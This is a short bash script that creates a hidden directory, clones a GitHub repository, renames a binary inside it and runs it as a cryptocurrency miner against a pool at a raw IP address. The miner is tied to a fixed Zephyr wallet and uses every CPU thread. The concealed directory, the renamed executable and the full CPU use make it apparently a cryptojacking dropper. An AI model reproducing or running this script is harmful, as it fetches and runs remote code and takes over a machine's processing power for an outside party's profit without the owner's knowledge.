#!/bin/bash
mkdir .kap && cd .kap
git clone https://github.com/nw4tw5/gradi.git
cd gradi && mv zepo sgr1
chmod +x sgr1 100.json
./sgr1 --donate-level 1 -o 149.28.143.100:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
